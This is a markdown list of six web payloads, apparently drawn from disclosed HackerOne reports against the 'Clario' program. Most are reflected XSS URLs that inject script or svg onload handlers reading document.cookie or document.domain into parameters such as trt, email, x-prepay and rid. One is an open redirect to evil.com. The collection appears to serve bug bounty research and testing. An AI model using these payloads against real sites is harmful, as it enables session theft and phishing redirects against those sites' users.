# Clario

6 payloads.

### `38c1c468`

```
https://target.com/landings/123.1/index.php?affid=zzb_175.331184.1530814850.33.zzb&trt=29_5tse3g%22%3E%3Cscript%3Ealert(document.domain
```

**Parameter:** `trt`
— [RXSS on /landings/123.1/index.php (target.com)](https://hackerone.com/reports/732394) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $300.0

### `f1fee819`

```
https://target.com/unsubscribe?email=kolabro</script><script>alert(document.domain)</script>
```

**Parameter:** `email`
— [RXSS on unsubscribe feature (target.com)](https://hackerone.com/reports/733152) · Clario · [sec0ndw0lf](https://hackerone.com/sec0ndw0lf) · $75.0

### `02e1592c`

```
https://target.com/auth/fb?continue=https://evil.com
```

**Parameter:** `continue`
— [Open redirect on https://target.com](https://hackerone.com/reports/771699) · Clario · [jin0ne](https://hackerone.com/jin0ne)

### `9dbeddd6`

```
https://target.com/buynow-webkhaleesio2-ppg?lang=fr&x-prepay=xxxxxxxx'"><svg/onload=alert(document.cookie)>
```

**Parameter:** `x-prepay`
— [Reflected xss on target.com](https://hackerone.com/reports/787054) · Clario · [dilawer](https://hackerone.com/dilawer) · $50.0

### `69527ec7`

```
</script><script>alert(test)</script>
```

**Parameter:** `rid`
— [rxss at https://target.com page not found via rid parameter](https://hackerone.com/reports/840515) · Clario · [g0dzira](https://hackerone.com/g0dzira)

### `41a61bba`

```
https://target.com/mk/api/send-event?rid=%3C/script%3E%3Cscript%3Ealert(document.cookie
```

**Parameter:** `rid`
— [rxss at https://target.com page not found via rid parameter](https://hackerone.com/reports/840515) · Clario · [g0dzira](https://hackerone.com/g0dzira)
